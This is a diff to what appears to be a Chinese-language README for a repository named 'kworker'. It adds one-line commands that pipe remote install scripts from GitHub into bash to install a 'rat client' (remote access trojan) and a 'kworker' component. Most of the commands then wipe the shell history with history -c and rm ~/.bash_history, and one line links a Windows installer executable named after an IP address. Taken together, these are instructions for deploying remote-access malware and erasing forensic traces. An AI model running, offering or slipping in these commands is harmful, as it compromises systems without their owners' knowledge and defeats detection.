@@ -1,11 +1,16 @@
-bash -c "$(curl -fsSL https://raw.githubusercontent.com/wondream322/kworker/master/install.sh)"
 
-清除记录
 
+install rat client and kworker
 bash -c "$(curl -fsSL https://raw.githubusercontent.com/wondream322/kworker/master/install_all.sh)" && history -c && history -cw && rm -f ~/.bash_history
 
-
+单独install rat client
 bash -c "$(curl -fsSL https://raw.githubusercontent.com/wondream322/kworker/master/install_rat.sh)" && history -c && history -cw && rm -f ~/.bash_history
 
-
+单独install kworker
 bash -c "$(curl -fsSL https://raw.githubusercontent.com/wondream322/kworker/master/install.sh)" && history -c && history -cw && rm -f ~/.bash_history
+
+单独下载rat client
+https://raw.githubusercontent.com/wondream322/kworker/master/win/Install_104.143.36.54_v2.exe
+
+单独安装，不清理数据
+bash -c "$(curl -fsSL https://raw.githubusercontent.com/wondream322/kworker/master/install.sh)"
